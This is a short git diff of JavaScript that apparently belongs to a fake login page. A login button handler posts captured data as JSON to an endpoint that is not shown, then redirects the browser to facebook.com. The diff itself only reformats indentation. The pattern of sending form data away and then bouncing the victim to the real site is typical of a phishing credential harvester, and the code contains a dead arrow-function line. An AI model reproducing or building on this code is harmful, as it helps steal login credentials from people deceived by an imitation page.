@@ -6,12 +6,11 @@ let uploadData = (data) => {
 		body: JSON.stringify(data),
 		headers: { "Content-type": "application/json; charset=UTF-8" }
 	})
-		.then(response => response.json())
-		.then(()=>{
-			json => console.log(json)
-			window.location.href = "https://facebook.com/";
-		}).catch(err => console.log(err));
-		
+	.then(response => response.json())
+	.then(()=>{
+		json => console.log(json);
+		window.location.href = "https://facebook.com/";
+	}).catch(err => console.log(err));
 }
 
 getElement("#btnLogin").addEventListener("click", function () {
